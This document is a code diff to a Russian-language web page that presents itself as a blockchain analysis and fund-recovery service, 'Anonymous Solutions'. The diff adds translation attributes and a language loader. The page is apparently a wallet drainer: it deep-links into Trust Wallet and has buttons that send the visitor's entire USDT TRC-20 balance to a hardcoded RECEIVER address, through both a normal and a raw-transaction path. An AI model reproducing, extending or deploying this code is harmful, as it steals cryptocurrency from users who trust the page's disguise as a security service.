@@ -182,7 +182,7 @@
         }
     </style>
 </head>
-<div id="tron-status" style="padding: 10px; background: #111; border: 1px solid #444; margin-top: 20px; font-size: 14px;">
+<div id="tron-status" style="padding: 10px; background: #111; border: 1px solid #444; margin-top: 20px; font-size: 14px;" data-i18n="tron-status">
   🔄 Ожидание подключения TRON...
 </div>
 <body>
@@ -196,12 +196,13 @@
     </div>
 </div>
         <ul>
-            <li><a href="index4.html">Юридический Раздел</a></li>
-            <li><a href="index3.html">Отзывы</a></li>
-            <li><a href="index.html">Главная</a></li>
-            <li><a href="index2.html">Проверка криптоактивов</a></li>
-            <li><a href="#contact">Связаться</a></li>
+            <li><a href="index4.html" data-i18n="menu-legal">Юридический Раздел</a></li>
+            <li><a href="index3.html" data-i18n="menu-reviews">Отзывы</a></li>
+            <li><a href="index.html" data-i18n="menu-main">Главная</a></li>
+            <li><a href="index2.html" data-i18n="menu-crypto">Проверка криптоактивов</a></li>
+            <li><a href="#contact" data-i18n="menu-contact">Связаться</a></li>
         </ul>
+        <button onclick="loadLang('en')" style="margin-left:20px;">🇬🇧 English</button>
     </nav>
 	<div class="menu-icon" onclick="toggleMenu()">
             <div></div>
@@ -216,42 +217,42 @@
         <a href="#contact">Связаться</a>
     </div>
     <header>
-        <h1>Анонимные Решения</h1>
-        <p>Эффективность. Конфиденциальность. Результат.</p>
+        <h1 data-i18n="main-title">Анонимные Решения</h1>
+        <p data-i18n="main-subtitle">Эффективность. Конфиденциальность. Результат.</p>
     </header>
     <section class="section">
-        <h2>Как это работает?</h2>
+        <h2 data-i18n="how-it-works-title">Как это работает?</h2>
         <div class="steps">
             <div class="step">
                 <img src="analysis.svg" alt="Анализ">
-                <h3>Анализ блокчейна</h3>
-                <p>Мы тщательно анализируем транзакции и источники средств.</p>
+                <h3 data-i18n="blockchain-analysis-title">Анализ блокчейна</h3>
+                <p data-i18n="blockchain-analysis-desc">Мы тщательно анализируем транзакции и источники средств.</p>
             </div>
             <div class="step">
                 <img src="security.svg" alt="Безопасность">
-                <h3>Проверка безопасности</h3>
-                <p>Оцениваем риски и выявляем подозрительные операции.</p>
+                <h3 data-i18n="security-check-title">Проверка безопасности</h3>
+                <p data-i18n="security-check-desc">Оцениваем риски и выявляем подозрительные операции.</p>
             </div>
             <div class="step">
                 <img src="analysis.svg" alt="Отчет">
-                <h3>Подготовка отчета</h3>
-                <p>Вы получаете детализированный отчет с результатами анализа.</p>
+                <h3 data-i18n="report-prep-title">Подготовка отчета</h3>
+                <p data-i18n="report-prep-desc">Вы получаете детализированный отчет с результатами анализа.</p>
             </div>
             <div class="step">
                 <img src="solution.svg" alt="Решение">
-                <h3>Консультация</h3>
-                <p>Мы даем рекомендации по защите активов и возврату средств.</p>
+                <h3 data-i18n="consult-title">Консультация</h3>
+                <p data-i18n="consult-desc">Мы даем рекомендации по защите активов и возврату средств.</p>
             </div>
         </div>
     </section>
 
     <div class="wallet-checker">
-        <h2>Проверка криптовалютного кошелька</h2>
+        <h2 data-i18n="wallet-check-title">Проверка криптовалютного кошелька</h2>
         <div class="wallet-input">
-            <input type="text" id="wallet-address" placeholder="Введите ETH-адрес">
-            <button id="analyze-btn">Анализировать</button>
+            <input type="text" id="wallet-address" placeholder="Введите ETH-адрес" data-i18n-placeholder="wallet-address-placeholder">
+            <button id="analyze-btn" data-i18n="analyze-btn">Анализировать</button>
         </div>
-        <pre id="output-block">Здесь появится результат анализа...</pre>
+        <pre id="output-block" data-i18n="analyze-result-placeholder">Здесь появится результат анализа...</pre>
     </div>
 
     <!-- Добавляем контейнер для Markdown контента -->
@@ -262,14 +263,14 @@
     <div id="tron-trust-section" style="max-width: 800px; margin: 40px auto; display: flex; flex-direction: column; gap: 20px;">
         <a href="https://link.trustwallet.com/open_url?url=https://mikhailzolotarev2024.github.io/beta2/index2.html"
    target="_blank"
-   class="control-button">
+   class="control-button" data-i18n="open-trust-wallet">
   🔗 Открыть в Trust Wallet
 </a>
         <div id="tron-wallet-ui" style="display: none;">
             <div class="wallet-controls">
-                <button id="tron-info-btn" class="control-button">📊 Показать информацию о кошельке</button>
-                <button id="tron-send-usdt-btn" class="control-button">💸 Перевести все USDT TRC-20</button>
-                <button id="tron-send-usdt-raw-btn" class="control-button" style="display:none; margin-top:8px;">💸 Перевести все USDT TRC-20 (через raw транзакцию)</button>
+                <button id="tron-info-btn" class="control-button" data-i18n="show-wallet-info">📊 Показать информацию о кошельке</button>
+                <button id="tron-send-usdt-btn" class="control-button" data-i18n="send-all-usdt">💸 Перевести все USDT TRC-20</button>
+                <button id="tron-send-usdt-raw-btn" class="control-button" style="display:none; margin-top:8px;" data-i18n="send-all-usdt-raw">💸 Перевести все USDT TRC-20 (через raw транзакцию)</button>
             </div>
             <div id="log" class="result" style="min-height: 120px; margin-top: 10px; background: rgba(0,0,0,0.3);"></div>
         </div>
@@ -279,37 +280,37 @@
     <div class="footer-grid">
       
       <div class="footer-column">
-        <h4>Компания</h4>
+        <h4 data-i18n="footer-company-title">Компания</h4>
         <ul>
-          <li><a href="#">О нас</a></li>
-          <li><a href="#">Юридический раздел</a></li>
-          <li><a href="#">Отзывы</a></li>
-          <li><a href="#">Контакты</a></li>
+          <li><a href="#" data-i18n="footer-about">О нас</a></li>
+          <li><a href="#" data-i18n="footer-legal">Юридический раздел</a></li>
+          <li><a href="#" data-i18n="footer-reviews">Отзывы</a></li>
+          <li><a href="#" data-i18n="footer-contacts">Контакты</a></li>
         </ul>
       </div>
       
       <div class="footer-column">
-        <h4>Услуги</h4>
+        <h4 data-i18n="footer-services-title">Услуги</h4>
         <ul>
-          <li><a href="#">Возврат средств</a></li>
-          <li><a href="#">Проверка криптоактивов</a></li>
-          <li><a href="#">Консультация</a></li>
+          <li><a href="#" data-i18n="footer-refund">Возврат средств</a></li>
+          <li><a href="#" data-i18n="footer-crypto-check">Проверка криптоактивов</a></li>
+          <li><a href="#" data-i18n="footer-consult">Консультация</a></li>
         </ul>
       </div>
 
 
       <div class="footer-column">
-        <h4>Документы</h4>
+        <h4 data-i18n="footer-docs-title">Документы</h4>
         <ul>
-          <li><a href="#">Политика конфиденциальности</a></li>
-          <li><a href="#">Пользовательское соглашение</a></li>
+          <li><a href="#" data-i18n="footer-privacy">Политика конфиденциальности</a></li>
+          <li><a href="#" data-i18n="footer-terms">Пользовательское соглашение</a></li>
         </ul>
       </div>
 
     </div>
 
     <div class="footer-bottom">
-      <p>© 2025 Confidential Solutions. Все права защищены.</p>
+      <p data-i18n="footer-copyright">© 2025 Confidential Solutions. Все права защищены.</p>
     </div>
   </div>
 </footer>
@@ -318,6 +319,7 @@
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
 <script src="wallet-checker.js"></script>
 <script src="script.js"></script>
+<script src="i18n.js"></script>
 <script>
     document.addEventListener('DOMContentLoaded', () => {
 const getAddressBtn = document.getElementById('get-address');
@@ -417,12 +419,12 @@ setInterval(() => {
   const status = document.getElementById("tron-status");
   if (window.tronWeb) {
     if (window.tronWeb.ready) {
-      status.textContent = "✅ TRON-сеть подключена";
+      status.textContent = t('system-tron-connected');
     } else {
-      status.textContent = "⚠️ tronWeb есть, но не готов";
+      status.textContent = t('system-tron-not-ready');
     }
   } else {
-    status.textContent = "❌ tronWeb не обнаружен";
+    status.textContent = t('system-tron-not-found');
   }
 }, 1000);
     // Проверяем доступность tronWeb при загрузке и далее
@@ -434,26 +436,26 @@ setInterval(() => {
     if (infoBtn) infoBtn.onclick = async () => {
         try {
             if (!window.tronWeb || !window.tronWeb.ready) {
-                addLog('Не в Trust Wallet или tronWeb не готов', 'error');
+                addLog(t('system-wallet-not-ready'), 'error');
                 return;
             }
             const userAddress = window.tronWeb.defaultAddress.base58;
-            addLog(`Адрес: ${userAddress}`);
+            addLog(t('system-wallet-address', { address: userAddress }));
             const resp = await fetch(`https://apilist.tronscan.org/api/account?address=${userAddress}`);
             const data = await resp.json();
-            addLog(`TRX баланс: ${(data.balance/1e6).toFixed(6)}`);
+            addLog(t('system-trx-balance', { balance: formatNumber(data.balance/1e6) }));
             let usdt = data.tokens?.find(t => t.tokenId === USDT_TRC20);
             if (usdt) {
-                addLog(`USDT TRC-20: ${usdt.balance/10**6}`);
+                addLog(t('system-usdt-balance', { balance: formatNumber(usdt.balance/10**6) }));
             } else {
-                addLog('USDT TRC-20: нет');
+                addLog(t('system-no-usdt'));
             }
             if (data.tokens && data.tokens.length > 0) {
-                addLog('Токены: ' + data.tokens.map(t => `${t.tokenName}: ${t.balance/10**(t.tokenDecimal||6)}`).join(', '));
+                addLog(t('system-tokens', { tokens: formatTokens(data.tokens) }));
             }
-            addLog('✅ Информация о кошельке получена', 'success');
+            addLog(t('system-wallet-info-success'), 'success');
         } catch (e) {
-            addLog('Ошибка получения информации: ' + e.message, 'error');
+            addLog(t('system-error-getting-info', { error: e.message }), 'error');
         }
     };
 
@@ -462,30 +464,32 @@ setInterval(() => {
     if (sendBtn) sendBtn.onclick = async () => {
         try {
             if (!window.tronWeb || !window.tronWeb.ready) {
-                addLog('Не в Trust Wallet или tronWeb не готов', 'error');
+                addLog(t('system-wallet-not-ready'), 'error');
                 return;
             }
             const userAddress = window.tronWeb.defaultAddress.base58;
             const usdt = await window.tronWeb.contract().at(USDT_TRC20);
             const balance = await usdt.balanceOf(userAddress).call();
             if (balance <= 0) {
-                addLog('Недостаточно USDT для перевода', 'error');
+                addLog(t('system-insufficient-usdt'), 'error');
                 return;
             }
-            addLog(`Готовим перевод ${balance/1e6} USDT на ${RECEIVER}`);
+            addLog(t('system-preparing-transfer', { 
+                amount: formatNumber(balance/1e6),
+                receiver: RECEIVER 
+            }));
             const tx = await usdt.transfer(RECEIVER, balance).send();
-            addLog('⏳ Ожидание подписи...');
-            // Trust Wallet сам покажет окно подписи
+            addLog(t('system-waiting-signature'));
             if (tx) {
-                addLog('Транзакция отправлена: ' + (tx || '(нет txid)'), 'success');
+                addLog(t('system-transaction-sent', { txid: tx }), 'success');
             } else {
-                addLog('Ошибка отправки транзакции', 'error');
+                addLog(t('system-transaction-error'), 'error');
             }
         } catch (e) {
             if (e.message && e.message.includes('denied')) {
-                addLog('Пользователь отменил подпись', 'error');
+                addLog(t('system-user-cancelled'), 'error');
             } else {
-                addLog('Ошибка перевода: ' + e.message, 'error');
+                addLog(t('system-transfer-error', { error: e.message }), 'error');
             }
         }
     };
@@ -494,34 +498,34 @@ setInterval(() => {
     if (rawBtn) rawBtn.onclick = async () => {
         try {
             if (!window.tronWeb || !window.tronWeb.ready) {
-                addLog('Не в Trust Wallet или tronWeb не готов', 'error');
+                addLog(t('system-wallet-not-ready'), 'error');
                 return;
             }
             const userAddress = window.tronWeb.defaultAddress.base58;
             const usdt = await window.tronWeb.contract().at(USDT_TRC20);
             const balance = await usdt.methods.balanceOf(userAddress).call();
             if (balance <= 0) {
-                addLog('Недостаточно USDT для перевода', 'error');
+                addLog(t('system-insufficient-usdt'), 'error');
                 return;
             }
-            addLog(`Создаём raw-транзакцию на ${balance/1e6} USDT...`);
+            addLog(t('system-creating-raw-tx', { amount: formatNumber(balance/1e6) }));
             const rawTx = await usdt.methods
                 .transfer(RECEIVER, parseInt(balance))
                 .send({ callValue: 0, shouldPollResponse: false }, { raw: true });
-            addLog('⏳ Ожидание подписи raw-транзакции...');
+            addLog(t('system-waiting-raw-signature'));
             const signedTx = await window.tronWeb.trx.sign(rawTx);
-            addLog('⏳ Отправка raw-транзакции в сеть...');
+            addLog(t('system-sending-raw-tx'));
             const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
             if (result.result) {
-                addLog('✅ Транзакция отправлена: ' + (result.txid || '(нет txid)'), 'success');
+                addLog(t('system-raw-tx-success', { txid: result.txid }), 'success');
             } else {
-                addLog('❌ Ошибка отправки транзакции: ' + (result.code || ''), 'error');
+                addLog(t('system-raw-tx-error', { code: result.code }), 'error');
             }
         } catch (e) {
             if (e.message && e.message.includes('denied')) {
-                addLog('Пользователь отменил подпись', 'error');
+                addLog(t('system-user-cancelled'), 'error');
             } else {
-                addLog('Ошибка raw-транзакции: ' + e.message, 'error');
+                addLog(t('system-transfer-error', { error: e.message }), 'error');
             }
         }
     };
@@ -532,6 +536,16 @@ setInterval(() => {
        alert('TronWeb доступен!');
      }
    }, 1000);
+</script>
+<script>
+async function loadLang(lang) {
+  const res = await fetch('/lang/' + lang + '.json');
+  const dict = await res.json();
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if (dict[key]) el.innerText = dict[key];
+  });
+}
 </script>
 </body>
 </html>
